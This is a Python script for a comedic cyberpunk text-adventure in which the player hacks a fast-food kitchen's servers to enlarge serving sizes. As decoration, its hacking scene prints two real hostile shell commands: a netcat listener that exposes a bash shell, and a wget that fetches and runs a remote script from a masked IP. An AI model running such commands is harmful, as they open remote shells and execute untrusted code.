from time import sleep
import hacking, obstacle
import animation as a

# intro text
start = input("Having vowed to fix the criminal serving sizes here,\nYou have successfully snuck into the Amazing Taste automated kitchen.\n" \
"Before you, molten patties of \"meat\" product whiz by on a conveyor belt.\nYou will have to dodge past them to continue.")
# minigame 1 illogic puzzle

# minigame 2 obstacle course
if start:
    pass
obstacle.game_loop(obstacle.main_animation)
start = input("Great job! We're in the server room now. You sit before the server rack,\nprop your cyberdeck on your lap,\nand smile as your cyberViser whirs to life.\nLet's get hacking!")
if start:
    pass

#minigame 3 hacking
a.animate_ascii(a.animation_frames)
print("nc -nvlp 1337 -e /bin/bash")
sleep(2.5)
print("/bin/sh$")
sleep(0.5)
print("/bin/sh$ cd /temp/ & wget http://135.xxx.xxx.xxx/omegaPwn.py -o omegaPwn.py & ./omegaPwn.py")
sleep(0.5)
print("You're in the mainframe. The elastic strap of your cyberViser is soaked through with inefficient human coolant.\n" \
"There's just one more layer of ICE to crack.\n" \
"Can you hack it, hacker?")
hacking.getFight(hacking.player, hacking.Enemy.virus)
nextMove = input("You update the meal recipe, tripling the serving sizes.\nCorpor will surely notice the discrepancy in a few months, or maybe years.\nBut tonight, there's a party at Amazing Taste!")

# outro text / win

# lose function